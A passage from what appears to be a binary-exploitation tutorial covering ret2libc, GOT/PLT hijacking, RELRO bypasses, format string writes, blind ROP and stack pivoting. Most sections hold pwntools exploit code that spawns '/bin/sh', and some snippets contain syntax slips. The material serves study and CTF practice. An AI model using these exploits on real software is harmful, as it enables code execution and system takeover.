rbp_leak = format_string_leak(offset_of_rbp)

# Calculate return address location
ret_addr_location = rbp_leak + 8

# Calculate buffer location
buffer_location = rbp_leak - buffer_offset
```

**Leaking via argv/envp:**

```python
# Stack contains pointers to argv/envp at top
# These point to stack addresses

# Leak argv[0] pointer
argv0_ptr = format_string_leak(argc_offset)

# This reveals stack address
stack_leak = argv0_ptr
```

### PIE Bypass Strategies

**PIE (Position Independent Executable):** Randomizes code base address

**Detection:**

```bash
readelf -h binary | grep Type
# DYN = PIE enabled
# EXEC = PIE disabled (fixed address)

checksec --file=binary
# PIE: PIE enabled / No PIE
```

**Leak techniques:**

**1. Leak code pointer from stack:**

```python
# Return addresses on stack point to code
# Format string to leak return address
code_leak = format_string_leak(ret_addr_offset)

# Calculate base (need to know offset of leaked function)
binary_base = code_leak - known_function_offset
```

**2. Leak via partial overwrite:**

```python
# PIE randomizes upper bytes only
# Lower 12 bits (page offset) are fixed

# Can overwrite LSB to jump to nearby code
payload = b'A' * offset
payload += b'\x34\x12'  # Jump to known offset in same binary
```

**3. Leak via GOT entries:**

```python
# GOT entries in PIE binary also randomized
# But can leak via arbitrary read

# Leak GOT entry for imported function
got_entry = leak_memory(binary_base + got_offset)

# Use known function address to calculate binary base
```

### Blind ROP (BROP)

**Scenario:** No binary, only remote service with crash feedback

**Technique:** Systematically probe for gadgets and addresses

**BROP algorithm:**

```python
# Step 1: Find stack buffer overflow length
for length in range(1, 1000):
    if crashes_after(length):
        overflow_offset = length
        break

# Step 2: Find stop gadget (doesn't crash)
for addr in range(0x400000, 0x500000):
    if not crashes_with_return(addr):
        stop_gadget = addr  # Likely infinite loop or hang

# Step 3: Find BROP gadget (pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret)
# Recognizable by pop-6-ret pattern

# Step 4: Leak binary via puts/write
# Use found gadgets to call puts with incrementing addresses
```

[Inference] BROP is time-intensive and primarily relevant for advanced CTF challenges or scenarios without binary access.

---

**Critical related topics:**

- **ret2dlresolve** (exploiting dynamic linker for arbitrary function resolution)
- **ret2csu** (using __libc_csu_init gadgets for complex register setup)
- **One-gadget exploitation** (single libc gadget for shell, requires specific constraints)
- **RELRO bypass** (Partial RELRO GOT overwrite, Full RELRO exploitation via other primitives)

---

## ret2libc Attacks

ret2libc (return-to-libc) exploits call libc functions without injecting shellcode, bypassing NX/DEP protections. The technique chains libc function calls through controlled return addresses, enabling arbitrary command execution or system manipulation.

**ret2libc principle**

Standard shellcode injection fails with NX enabled. Instead, redirect execution to existing libc functions:

```
Normal exploitation (NX disabled):
[buffer] [shellcode] [return to shellcode]

ret2libc (NX enabled):
[buffer] [libc_function_addr] [gadgets to set args]
```

**Libc function catalog for exploitation**

Key functions enabling arbitrary execution:

```
system(const char *cmd)         ; Execute shell command
execve(path, argv, envp)        ; Execute binary
mprotect(addr, len, prot)       ; Change page protections
mmap(addr, len, prot, flags)    ; Allocate executable memory
dlopen(filename, flags)         ; Load shared library
```

**System() exploitation (simplest)**

System executes shell commands:

```c
system("/bin/sh");              ; Spawns interactive shell
system("cat /flag > /tmp/flag"); ; Read protected file
```

**Basic ret2libc exploit:**

```python
from pwn import *

elf = ELF('./binary')
libc = ELF('./libc.so.6')

# Calculate addresses
system_addr = elf.plt['system']     # or libc_base + system_offset
bin_sh_addr = libc.search(b'/bin/sh').__next__()

# Build ROP chain
pop_rdi_ret = 0x401234              # gadget: pop rdi; ret

# Payload structure
offset = 40
payload = b'A' * offset
payload += p64(pop_rdi_ret)
payload += p64(bin_sh_addr)         # RDI = "/bin/sh"
payload += p64(system_addr)         # call system

p = process('./binary')
p.send(payload)
p.interactive()
```

**Execve() exploitation (more complex)**

Execve requires 3 arguments (path, argv, envp):

```c
execve("/bin/sh", NULL, NULL)
```

**ROP chain construction:**

```python
# Addresses
pop_rdi_ret = 0x401234
pop_rsi_ret = 0x401235
pop_rdx_ret = 0x401236
execve_addr = elf.plt['execve']

# Arguments
bin_sh = libc.search(b'/bin/sh').__next__()
null_ptr = 0x0

# Chain
chain = p64(pop_rdi_ret)
chain += p64(bin_sh)               # RDI = "/bin/sh"
chain += p64(pop_rsi_ret)
chain += p64(null_ptr)             # RSI = NULL
chain += p64(pop_rdx_ret)
chain += p64(null_ptr)             # RDX = NULL
chain += p64(execve_addr)          # call execve

payload = b'A' * offset + chain
```

**Mprotect() for NX bypass**

Change page protections to executable:

```c
mprotect(shellcode_addr, 0x1000, PROT_READ | PROT_WRITE | PROT_EXEC)
```

Enables injected shellcode execution:

```python
# mprotect arguments
shellcode_addr = 0x601000
page_size = 0x1000
prot_rwx = 7  # PROT_READ | PROT_WRITE | PROT_EXEC

chain = p64(pop_rdi_ret)
chain += p64(shellcode_addr)
chain += p64(pop_rsi_ret)
chain += p64(page_size)
chain += p64(pop_rdx_ret)
chain += p64(prot_rwx)
chain += p64(mprotect_addr)

# Write shellcode after mprotect
chain += p64(shellcode_addr)  # Jump to shellcode
```

**Information leak via ret2libc**

Read memory using printf/write:

```python
# printf("Format string", leak_addr)
pop_rdi_ret = 0x401234
printf_addr = elf.plt['printf']

leak_target = 0x601234

chain = p64(pop_rdi_ret)
chain += p64(leak_target)
chain += p64(printf_addr)
```

**ret2libc with ASLR**

ASLR randomizes libc base, requiring leak:

```python
# Step 1: Leak libc pointer
leaked = leak_via_format_string()
libc_base = leaked - known_offset

# Step 2: Calculate function addresses
system_addr = libc_base + system_offset
bin_sh = libc_base + bin_sh_offset

# Step 3: Build chain with calculated addresses
chain = build_chain(system_addr, bin_sh)
```

**Mmap() for arbitrary allocation**

Allocate new memory without modifying existing protections:

```c
void *addr = mmap(0x601000, 0x1000, PROT_READ | PROT_WRITE | PROT_EXEC, 
                   MAP_ANON | MAP_PRIVATE, -1, 0)
```

Write shellcode to allocated memory:

```python
mmap_addr = libc_base + mmap_offset
shellcode_addr = 0x601000

# mmap arguments: addr, len, prot, flags, fd, offset
chain = set_args(shellcode_addr, 0x1000, 7, MAP_ANON|MAP_PRIVATE, -1, 0)
chain += p64(mmap_addr)

# Write shellcode
chain += write_to_memory(shellcode_addr, shellcode)

# Execute
chain += p64(shellcode_addr)
```

**ret2libc chain verification (GDB)**

```bash
gdb ./binary
(gdb) break vulnerable
(gdb) run payload
(gdb) x/10i $rip
; Step through chain
(gdb) stepi
(gdb) print $rdi
; Verify arguments
```

**ret2libc with stack canary**

Canary positioned before return address:

```python
# Leak canary
canary = leak_canary()

offset = 40
payload = b'A' * offset
payload += p64(canary)           # Correct canary
payload += p64(0x0)              # Saved RBP
payload += p64(pop_rdi_ret)      # Start ROP chain
payload += p64(bin_sh)
payload += p64(system_addr)

p.send(payload)
```

**ret2libc with PIE**

Binary addresses randomized, require leak:

```python
# Leak binary pointer
leaked_binary_addr = leak_binary_addr()
binary_base = leaked_binary_addr - binary_offset

# Calculate gadget addresses
pop_rdi_ret = binary_base + gadget_offset
system_addr = libc_base + system_offset  # Libc also requires leak

chain = build_chain_with_bases(binary_base, libc_base)
```

**Dlopen() for library loading**

Dynamically load external library:

```c
void *libc_handle = dlopen("/lib64/libc.so.6", RTLD_LAZY)
```

Exploitation for loading custom library or alternate libc.

**Dlsym() function resolution**

Resolve function addresses at runtime:

```c
system_t system_func = (system_t)dlsym(libc_handle, "system")
```

Enables function lookup bypassing direct function pointers.

**ret2libc chain generation (pwntools)**

Automated chain building:

```python
from pwn import *

elf = ELF('./binary')
libc = ELF('./libc.so.6')

rop = ROP(elf)
rop.call('system', [elf.search(b'/bin/sh').__next__()])

print(rop.dump())

payload = b'A' * 40
payload += rop.chain()
```

**ret2libc real-world examples**

**Stack buffer overflow + ret2libc:**

```c
void vulnerable(char *input) {
    char buf[32];
    strcpy(buf, input);  // Overflow
}
```

Exploit:

```bash
./binary $(python3 -c "print('A'*40 + '...' + system_chain)")
```

**Function pointer overwrite + ret2libc:**

```c
void (*callback)(void) = &safe_func;
strcpy(buf, input);     // Overflow
callback();             // Calls ret2libc chain
```

---

## GOT/PLT Hijacking

GOT (Global Offset Table) and PLT (Procedure Linkage Table) enable dynamic linking. Hijacking these structures redirects function calls to attacker-controlled code, achieving arbitrary execution without NX bypass.

**GOT/PLT mechanics**

PLT stubs contain code redirecting to GOT entries:

```asm
0x401050 <printf@plt>:
  401050: ff 25 ea 2f 00 00    jmp    [rip+0x2fea]  ; Jump to GOT[printf]
  401056: 68 00 00 00 00       push   0x0           ; PLT slot index
  40105b: e9 e0 ff ff ff       jmp    4010f0        ; Jump to resolver
```

GOT entry contains resolved libc address:

```
GOT[printf] = 0x7ffff7e50010  ; Address of libc printf
```

First call: resolver fills GOT entry. Subsequent calls jump directly.

**GOT corruption for hijacking**

Overwrite GOT entry with gadget address:

```python
got_printf = 0x601018
gadget_addr = 0x400600

# Overwrite GOT
write_primitive(got_printf, gadget_addr)

# Next printf() call executes gadget
printf("test");
```

**Detection: Checksec RELRO**

```bash
checksec --file=./binary
RELRO           : Partial    ; GOT writable
```

Full RELRO prevents GOT corruption (GOT read-only after linking).

**GOT hijacking exploit**

Prerequisites:

1. Write primitive (buffer overflow, format string)
2. Partial RELRO or no RELRO
3. Target function called after hijacking

**Exploitation:**

```python
from pwn import *

p = process('./binary')

# Leak binary/libc addresses (ASLR)
leaked = leak_via_format_string()
binary_base = calculate_binary_base(leaked)

# Calculate addresses
got_puts = binary_base + elf.got.offset['puts']
gadget_addr = binary_base + gadget_offset

# Write to GOT using format string
payload = fmt_string_write(got_puts, gadget_addr)
p.send(payload)

# Trigger puts() call
p.send(b'trigger')  ; Executes gadget instead of puts
```

**Format string GOT write**

Format string write primitive:

```python
def fmt_write(target_addr, value):
    """Generate format string to write at target_addr"""
    payload = b''
    payload += p64(target_addr)         # Write target
    payload += b'%' + str(value & 0xff).encode() + b'x%hhn'
    return payload
```

Multi-byte write:

```python
# Write 8-byte value to GOT
for i in range(8):
    offset = target_addr + i
    byte_val = (value >> (i*8)) & 0xff
    payload += fmt_write(offset, byte_val)
```

**Buffer overflow GOT write**

```python
# Overflow into writable region
# Place GOT write payload

got_system = 0x601018
gadget = 0x400600

payload = b'A' * offset
payload += p64(got_system)   # Overwrite GOT entry
payload += b'...gadget code...'
```

**PLT trampoline hijacking**

Modify PLT entry itself (if writable):

```python
# PLT entry at 0x401050
# Overwrite with jmp to gadget

plt_printf = 0x401050
gadget = 0x400600

# Write jmp instruction
jmp_gadget = asm('jmp 0x{:x}'.format(gadget))
write_primitive(plt_printf, jmp_gadget)
```

**GOT table identification**

```bash
objdump -R /path/to/binary | head -20
```

Output:

```
DYNAMIC RELOCATION RECORDS
OFFSET             TYPE              VALUE
0000000000601018   JUMP_SLOT         puts@GLIBC_2.2.5
0000000000601020   JUMP_SLOT         printf@GLIBC_2.2.5
0000000000601028   JUMP_SLOT         system@GLIBC_2.2.5
```

**GOT entry overwrite via buffer overflow**

Calculate overflow distance:

```bash
gdb ./binary
(gdb) print &got_function
$1 = (GLIBC_2.2.5 *) 0x601018

(gdb) break vulnerable
(gdb) run
(gdb) print $rbp - &buf
; Distance = buffer offset from RBP
```

**Exploitation:**

```python
# Calculate offset to GOT
buffer_offset = 40
got_offset = buffer_offset + extra
got_address = 0x601018

payload = b'A' * buffer_offset
payload += b'B' * (got_offset - buffer_offset)
payload += p64(gadget_address)
```

**Technique: Chained GOT hijacking**

Hijack multiple functions sequentially:

```python
# Step 1: Hijack puts to execute gadget_1
hijack(got_puts, gadget_1)

# gadget_1 executes, modifies memory

# Step 2: Hijack printf to execute gadget_2
# This requires gadget_1 to trigger
```

Chain multiple calls, each hijacking a different GOT entry.

**Detection: GOT writability test (GDB)**

```bash
gdb ./binary
(gdb) break main
(gdb) run
(gdb) x/10x 0x601018
(gdb) set *(int *)0x601018 = 0xdeadbeef
; If successful: GOT writable (Partial RELRO or no RELRO)
; If fails: Full RELRO (GOT read-only)
```

**Radare2 GOT analysis:**

```bash
r2 /path/to/binary
> is~got              ; List GOT symbols
> is~JUMP_SLOT        ; Show relocations
> axt @ 0x601018      ; Find references to GOT entry
```

**GOT hijacking with symbol masking**

Some binaries use symbol versioning, complicating GOT manipulation:

```bash
readelf -s /path/to/binary | grep GLIBC
```

Output shows version requirements. Hijacking must respect version info.

**Exploit mitigation: RELRO**

Full RELRO prevents GOT hijacking:

```bash
checksec --file=./binary
RELRO           : Full
```

GOT becomes read-only after dynamic linking, hijacking impossible.

---

## RELRO Bypass Techniques

Full RELRO prevents GOT hijacking by making GOT read-only. Bypasses require alternative exploitation strategies not relying on GOT modification.

**RELRO verification**

```bash
checksec --file=./binary
RELRO           : Full
```

Memory layout after RELRO:

```
.got section: READ-ONLY (after linking)
.got.plt section: READ-ONLY (after linking)
```

**RELRO bypass technique 1: Direct function calls**

Call libc functions via calculated addresses, not GOT:

```python
# Leak libc address
leaked = leak_via_format_string()
libc_base = leaked - offset

# Calculate function address directly
system_addr = libc_base + system_offset

# Build ROP chain calling direct address
rop = ROP(binary)
rop.raw(pop_rdi_gadget)
rop.raw(bin_sh_addr)
rop.raw(system_addr)  # Direct address, not GOT
```

**RELRO bypass technique 2: ROP gadget chains**

Existing binary instructions already public (no secrets in executable code):

```python
rop = ROP(binary)
rop.call('system', [bin_sh])  # Uses only gadgets from binary
```

**RELRO bypass technique 3: Mprotect() to disable**

Change memory protections to make GOT writable:

```python
# mprotect(0x601000, 0x1000, PROT_READ | PROT_WRITE | PROT_EXEC)
rop = ROP(binary)
rop.raw(pop_rdi_gadget)
rop.raw(0x601000)         # GOT address
rop.raw(pop_rsi_gadget)
rop.raw(0x1000)           # Page size
rop.raw(pop_rdx_gadget)
rop.raw(7)                ; PROT_RWX
rop.raw(mprotect_addr)

# Now GOT is writable, hijack it
rop.raw(pop_rdi_gadget)
rop.raw(got_system)
rop.raw(pop_rsi_gadget)
rop.raw(gadget_addr)
rop.raw(mov_rdi_rsi)      # Write to GOT
```

**RELRO bypass technique 4: Heap function pointers**

Overwrite function pointers on heap instead of GOT:

```c
struct callbacks {
    void (*func1)(void);
    void (*func2)(void);
} *callbacks = malloc(...);

callbacks->func1 = &safe_function;
```

Exploit heap overflow:

```python
# Overwrite heap function pointer
heap_overflow = b'A' * offset
heap_overflow += p64(gadget_addr)  # Overwrites func1

# Trigger callback
callbacks->func1();  ; Executes gadget
```

**RELRO bypass technique 5: Static initialization code**

.init_array and .fini_array contain function pointers:

```bash
objdump -s -j .init_array /path/to/binary
```

With Partial RELRO, these may be writable:

```python
# Overwrite .init_array entry
init_array_addr = 0x400e10
gadget = 0x400600

write_primitive(init_array_addr, gadget)
# At program exit or initialization, gadget executes
```

**RELRO bypass technique 6: Atexit handlers**

Register custom atexit handlers:

```c
atexit(&my_handler);  ; Handler called at exit
```

Exploit:

```python
# Call atexit with gadget address
rop = ROP(binary)
rop.raw(pop_rdi_gadget)
rop.raw(gadget_addr)
rop.raw(atexit_addr)

# At exit, gadget executes
```

**RELRO bypass technique 7: Signal handlers**

Overwrite signal handlers:

```c
signal(SIGSEGV, arbitrary_handler);  ; Install custom handler
```

Trigger signal:

```python
# Set signal handler to gadget
rop = ROP(binary)
rop.raw(pop_rdi_gadget)
rop.raw(SIGSEGV)
rop.raw(pop_rsi_gadget)
rop.raw(gadget_addr)
rop.raw(signal_addr)

# Trigger SIGSEGV
*(int *)0 = 0;  ; Segfault, handler called
```

**RELRO bypass technique 8: Longjmp buffer hijacking**

Corrupt setjmp buffer:

```python
# Overwrite setjmp buffer saved RIP
setjmp_buf_addr = 0x601000
gadget = 0x400600

write_at(setjmp_buf_addr + RIP_OFFSET, gadget)

# longjmp restores corrupted RIP
longjmp(buf, 1);
```

**RELRO bypass technique 9: Memory mapping corruption**

Corrupt file descriptor or memory mapping used by code:

```python
# Overwrite mmap-related structures
# Cause mmap to return attacker-controlled memory
```

[Unverified] Requires deep kernel knowledge, highly unreliable.

**RELRO bypass technique 10: Speculative execution (theoretical)**

[Unverified] Exploit speculative execution to execute code speculatively before RELRO check:

```
Speculative execution may allow brief execution outside
constrained memory regions before check is performed.
```

Modern mitigations (Spectre patches) prevent this.

**RELRO + NX combination bypass**

When both Full RELRO and NX enabled:

```bash
checksec --file=./binary
RELRO           : Full
NX              : Enabled
```

Exploit via:

1. ROP gadget chains (NX bypass)
2. Direct function calls (RELRO bypass)

**Combined exploit:**

```python
# Leak libc
leaked = leak_via_format_string()
libc_base = leaked - offset

# Build ROP chain with direct libc calls
rop = ROP(binary)
rop.raw(pop_rdi_gadget)
rop.raw(bin_sh)
rop.raw(libc_base + system_offset)

payload = b'A' * offset
payload += rop.chain()
```

---

## Format String Arbitrary Write

Format string vulnerabilities enable reading/writing arbitrary memory through format specifier misuse. Understanding format string mechanics enables powerful exploitation.

**Format string principles**

Printf family functions interpret format specifiers:

```c
printf("%x %x %x %x");     // Reads from stack
printf("%s", ptr);         // Reads string from ptr
printf("%n", &var);        // Writes to &var
```

Vulnerability: User-controlled format string:

```c
printf(user_input);        // Format string vuln
```

**Stack reading via %x**

Read stack values:

```python
payload = b"%x.%x.%x.%x.%x"
p.send(payload)
```

Output:

```
deadbeef.cafebabe.12345678.ffffffff.7f000000
```

**Precision format specifiers**

Read specific stack offset:

```python
payload = b"%5$x"         # Read 5th stack value
```

**Argument index for 64-bit**

Arguments passed via registers (RDI, RSI, RDX, RCX, R8, R9). Format string reads from stack:

```python
# First 6 arguments in registers, not on stack
# 7th+ arguments on stack

payload = b"%7$p"         # Read 7th argument (first on stack)
```

**Memory reading via %s**

Read string from arbitrary address:

```python
target_addr = 0x601234

payload = p64(target_addr)
payload += b"%s"
p.send(payload)

leaked_string = p.recv(1024)
```

**Arbitrary address reading:**

```python
def read_memory(addr, size=1024):
    payload = p64(addr)
    payload += b"%s"
    p.send(payload)
    return p.recv(size)

libc_base_str = read_memory(0x7ffff7000000)
```

**Memory writing via %n**

Write to memory:

```c
int var = 0;
printf("%n", &var);        // Writes number of bytes printed to var
```

Exploit:

```python
target_addr = 0x601234

payload = p64(target_addr)
payload += b"A" * 100      # Padding to control write value
payload += b"%n"           # Write number of bytes printed

# Bytes written = 8 (address) + 100 (padding) = 108 = 0x6c
```

**Precise value writing via %x and %n**

Control written value:

```python
target_addr = 0x601234
value_to_write = 0x12345678

# Calculate padding needed
bytes_printed = 8  ; address
needed_padding = value_to_write - bytes_printed

payload = p64(target_addr)
payload += b"X" * needed_padding
payload += b"%n"
```

**Byte-by-byte writing**

Write different values to different bytes:

```python
# Write 0x41 to first byte, 0x42 to second, etc.

payload = p64(target_addr)
payload += b"X" * (0x41 - 8)
payload += b"%hhn"          # %hhn: write 1 byte

payload += p64(target_addr + 1)
payload += b"Y" * (0x42 - 8)
payload += b"%hhn"
```

**Multi-byte format specifiers**

```
%n      : 4-byte write (int)
%hn     : 2-byte write (short)
%hhn    : 1-byte write (char)
%lln    : 8-byte write (long long)
```

**Address placeholder positioning**

Place addresses strategically:

```python
# Method 1: At beginning
payload = p64(target1) + p64(target2) + b"%08x.%08x"

# Method 2: Scattered
payload = b"%08x." + p64(target1) + b".%08x." + p64(target2)

# Method 3: After format specifiers
payload = b"%x %x %x %x " + p64(target)
```

**Direct parameter access**

Access specific parameters directly:

```python
# Read 5th parameter: %5$x
payload = b"%5$p"

# Write to 5th parameter: place address as 5th arg
payload = b"XXXX" * 4 + p64(target) + b"%n"
```

**Leaking stack canary via format string**

```python
# Canary typically stored on stack
payload = b"%23$p"       # Read 23rd stack value (example)
p.send(payload)
canary = int(p.recv(16), 16)
```

**Leaking return address**

```python
payload = b"%6$p"        # Return address position varies
p.send(payload)
ret_addr = int(p.recv(16), 16)
```

**GOT entry overwrite via format string**

Overwrite function pointer in GOT:

```python
got_puts = 0x601018
gadget = 0x400600

# Write gadget address to GOT
payload = p64(got_puts)
payload += b"X" * (gadget - 8)
payload += b"%n"
```

**Pwntools format string automation**

```python
from pwn import *

# Automatic format string exploitation
elf = ELF('./binary')

# Leak addresses
fmtstr = FmtStr(execute_fmt)  # Callback to trigger format string

# Write to GOT
fmtstr.write(elf.got['puts'], elf.symbols['system'])
fmtstr.execute_writes()
```

**Format string with limited buffer**

When format string space limited:

```python
# Use long format specifiers to reach higher stack values
payload = b"%10000000000000000x"  # Very large padding not feasible

# Alternative: use $x notation
payload = b"%100$x"               # Direct offset access
```

**Null byte elimination in format strings**

Null bytes terminate format strings:

```python
# Avoid null bytes
address = 0x601018
if b'\x00' in p64(address):
    print("Contains null byte, may fail")

# Solution: Use different address or encoding
```

**Format string exploitation framework**

Pwntools format string helpers:

```python
from pwn import *

# Calculate format offset
fmt_offset = FmtStr(process_target)
print(fmt_offset.offset)

# Leak values at offset
leaked = fmt_offset.leak(offset=5)

# Write to memory
fmt_offset.write(target_addr, value)
fmt_offset.execute_writes()
```

**Detection and mitigation**

Format string detection:

```bash
strings ./binary | grep "%x\|%p\|%n"
```

GDB breakpoint on printf:

```bash
gdb ./binary
(gdb) break printf
(gdb) run
(gdb) print $rdi
; Inspect format string
```

**Real-world format string examples**

Apache Chunked Encoding vulnerability used format strings for memory leaks.

sendmail format string bugs (CVE-2002-0391) enabled arbitrary code execution.

---

**Related bypass technique subtopics essential for comprehensive exploitation:** Integer overflow exploitation enabling buffer overflow preconditions, heap spray techniques for deterministic memory layout manipulation, and use-case specific bypasses for common frameworks (Node.js, Python, Java JNI) enabling exploitation across language boundaries.

---

# Advanced Exploitation

## Return-Oriented Programming (Advanced)

ROP is a code reuse technique that chains together small instruction sequences (gadgets) ending in `ret` to build arbitrary computation without injecting code.

### ROP Fundamentals Review

**Basic concept**:

```
Stack layout after buffer overflow:
+------------------+
| padding          |
+------------------+
| gadget1_addr     | <- Return here first
+------------------+
| gadget2_addr     | <- Then here
+------------------+
| gadget3_addr     | <- Then here
+------------------+
| ...              |
+------------------+
```

**Gadget execution flow**:

```asm
gadget1:
    pop rdi          ; Manipulate registers/memory
    ret              ; Jump to next gadget (gadget2_addr on stack)

gadget2:
    pop rsi
    pop rdx
    ret              ; Jump to gadget3_addr

gadget3:
    syscall          ; Execute system call
```

### Advanced Gadget Types

**Multi-instruction gadgets**:

```asm
; Complex gadget performing multiple operations
mov rax, [rbx]
add rax, rcx
mov [rdx], rax
pop rbx
pop rcx
pop rdx
ret
```

**Conditional gadgets**:

```asm
; Gadget with conditional logic
cmp rax, 0
jne skip
xor rax, rax
skip:
    pop rbx
    ret
```

**Memory operation gadgets**:

```asm
; Write-what-where gadget
mov qword ptr [rdi], rsi
ret

; Read gadget
mov rax, qword ptr [rdi]
ret

; String copy gadget
rep movsb
ret
```

**Arithmetic gadgets**:

```asm
; Addition
add rax, rbx
ret

; Subtraction
sub rax, rcx
ret

; Multiplication
imul rax, rdx
ret

; Bit operations
xor rax, rbx
ret

and rax, rcx
ret

or rax, rdx
ret
```

**Stack pivot gadgets**:

```asm
; Change stack pointer to controlled memory
xchg rsp, rax
ret

mov rsp, rdi
ret

lea rsp, [rax+0x100]
ret

pop rsp
ret
```

### Finding Gadgets

**ROPgadget tool**:

```bash
# Find all gadgets in binary
ROPgadget --binary ./binary

# Find specific gadget
ROPgadget --binary ./binary --only "pop|ret"
ROPgadget --binary ./binary --string "/bin/sh"

# Find gadgets in library
ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6

# Filter by instruction type
ROPgadget --binary ./binary --only "mov|ret"
ROPgadget --binary ./binary --only "add|sub|ret"

# Generate automatic ROP chain
ROPgadget --binary ./binary --ropchain

# Search for specific operations
ROPgadget --binary ./binary --depth 20 --only "syscall"
```

**ropper tool**:

```bash
# Interactive mode
ropper --file ./binary

# In ropper shell:
search pop rdi
search mov [%], %
search /bin/sh

# Filter gadgets
search pop r?x
search % = [%]

# Chain generation
ropper --file ./binary --chain "execve cmd=/bin/sh"
```

**pwntools ROP module**:

```python
from pwn import *

elf = ELF('./binary')
rop = ROP(elf)

# Automatic gadget search
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
pop_rsi_r15 = rop.find_gadget(['pop rsi', 'pop r15', 'ret'])[0]

# High-level ROP chain building
rop.call('puts', [elf.got['puts']])
rop.call('system', [next(elf.search(b'/bin/sh'))])

# Generate chain
print(rop.dump())
payload = rop.chain()
```

### Advanced ROP Techniques

#### Stack Pivoting

**Use case**: Limited buffer space, need to move stack to larger controlled region.

**Technique**:

```python
from pwn import *

p = process('./vuln')
elf = ELF('./vuln')

# Assume we control .bss section
bss_addr = elf.bss(0x800)

# Stage 1: Write full ROP chain to .bss using read()
# Stack pivot payload (in small buffer)
payload = b'A' * offset
payload += p64(pop_rdi)
payload += p64(0)                    # fd = stdin
payload += p64(pop_rsi_r15)
payload += p64(bss_addr)             # buf = .bss
payload += p64(0)                    # r15 (junk)
payload += p64(pop_rdx)
payload += p64(0x400)                # count
payload += p64(plt_read)             # read(0, bss_addr, 0x400)

# Pivot stack to .bss
payload += p64(pop_rsp)
payload += p64(bss_addr)             # RSP = bss_addr

p.send(payload)

# Stage 2: Send full ROP chain to .bss
rop_chain = p64(pop_rdi)
rop_chain += p64(next(elf.search(b'/bin/sh')))
rop_chain += p64(system)

p.send(rop_chain)
p.interactive()
```

**Alternative pivot methods**:

```python
# Using leave instruction
# leave is equivalent to: mov rsp, rbp; pop rbp

# Setup fake base pointer
payload += p64(pop_rbp)
payload += p64(bss_addr + 0x100)
payload += p64(leave_ret)            # mov rsp, rbp; pop rbp; ret
# After leave: RSP = bss_addr + 0x100, RBP = value at [bss_addr+0x100]

# Using xchg
payload += p64(pop_rax)
payload += p64(bss_addr)
payload += p64(xchg_rsp_rax)         # Swap RSP and RAX
```

#### Frame Faking (ret2csu)

**Technique**: Use `__libc_csu_init` gadgets present in most binaries for register control.

**Available gadgets** in `__libc_csu_init`:

```asm
; Gadget 1 (set registers)
pop rbx
pop rbp
pop r12
pop r13
pop r14
pop r15
ret

; Gadget 2 (call with controlled arguments)
mov rdx, r13
mov rsi, r14
mov edi, r15d
call qword ptr [r12 + rbx*8]
add rbx, 1
cmp rbx, rbp
jne <loop back>
pop rbx
pop rbp
pop r12
pop r13
pop r14
pop r15
ret
```

**Exploitation**:

```python
from pwn import *

elf = ELF('./vuln')

# Find csu gadgets
csu_init = elf.symbols['__libc_csu_init']

# Manual search for gadgets in __libc_csu_init
# Gadget 1 (pop registers): typically at offset +90
gadget1 = csu_init + 90

# Gadget 2 (call function): typically at offset +64
gadget2 = csu_init + 64

# Goal: Call write(1, got_entry, 8) to leak libc
def call_function(func_ptr, arg1, arg2, arg3):
    payload = b''
    
    # Use gadget1 to set up registers
    payload += p64(gadget1)
    payload += p64(0)              # rbx = 0
    payload += p64(1)              # rbp = 1 (for cmp, ensures single iteration)
    payload += p64(func_ptr)       # r12 = function pointer location
    payload += p64(arg3)           # r13 = rdx (3rd argument)
    payload += p64(arg2)           # r14 = rsi (2nd argument)
    payload += p64(arg1)           # r15 = edi (1st argument, 32-bit)
    
    # Use gadget2 to execute call
    payload += p64(gadget2)
    
    # After gadget2, need to pop 7 values (rbx, rbp, r12-r15)
    payload += p64(0) * 7
    
    return payload

# Build ROP chain
payload = b'A' * offset

# Leak libc address
payload += call_function(
    elf.got['write'],      # Function to call (address in GOT)
    1,                      # arg1: fd = stdout
    elf.got['puts'],       # arg2: buf = GOT entry
    8                       # arg3: count = 8 bytes
)

# Continue ROP chain after leak
payload += p64(pop_rdi)
payload += p64(elf.symbols['main'])
payload += p64(elf.plt['puts'])

p.send(payload)

# Receive leak
leak = u64(p.recv(8))
libc.address = leak - libc.symbols['puts']
```

**[Inference]**: The exact offsets for csu_init gadgets vary by binary and compilation. Use disassembly to locate precise offsets.

#### Ret2_dl_runtime_resolve (Basic Overview)

**Technique**: Fake dynamic linker resolution to call arbitrary functions without knowing their addresses.

**Simplified concept**:

```python
# When PLT stub is called first time:
# 1. Pushes relocation offset
# 2. Jumps to _dl_runtime_resolve
# 3. _dl_runtime_resolve uses relocation offset to find function
# 4. Resolves actual address from library
# 5. Updates GOT entry
# 6. Calls resolved function

# Exploitation: Forge fake relocation entries to resolve arbitrary function
```

This technique is covered in detail in the ret2dlresolve section below.

#### Partial Overwrite ROP

**Use case**: ASLR enabled but can only overwrite partial address bytes.

**Technique**:

```python
# On x86-64, last 12 bits of address are fixed due to page alignment
# Can brute force or partially overwrite to nearby function

# Example: Overwrite last 2 bytes of return address
# From:     0x00007ffff7a52000 (random)
# To:       0x00007ffff7a52XXX (controlled last 3 nibbles)

payload = b'A' * offset
payload += p16(0x1234)  # Overwrite only last 2 bytes

# Success rate: 1/16 for each nibble = 1/4096 for 3 nibbles
# But if target function is close, may work reliably
```

**Practical application**:

```python
# Overwrite to one_gadget in libc
# Only need to change last 2-3 bytes if close to known libc function

# Example: If puts@plt at 0x7ffff7a52000
# And one_gadget at 0x7ffff7a52abc
# Can overwrite with \xbc\x2a to reach one_gadget

payload = b'A' * offset
payload += b'\xbc\x2a'  # Partial overwrite
payload += b'\x00' * 6   # Keep upper bytes (or rely on existing stack data)
```

#### ROP in Position Independent Executables (PIE)

**Challenge**: All addresses randomized, need information leak.

**Approach**:

```python
# Stage 1: Leak PIE base
payload1 = b'A' * offset
payload1 += p64(pop_rdi_offset + pie_base)  # Can't use absolute address yet
payload1 += p64(got_entry_offset + pie_base)
payload1 += p64(plt_puts_offset + pie_base)
payload1 += p64(main_offset + pie_base)      # Return to main for second payload

# But we don't know PIE base initially...
# Solution: Use partial overwrite or other leak primitive first

# Alternative: Leak via format string, then construct ROP
p.sendline(b'%3$p')  # Leak stack address
stack_leak = int(p.recvline().strip(), 16)
pie_base = calculate_base(stack_leak)

# Now construct ROP with known addresses
```

### Advanced Shellcode via ROP

**mprotect ROP**: Make stack executable, then execute shellcode.

```python
from pwn import *

p = process('./vuln')
elf = ELF('./vuln')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

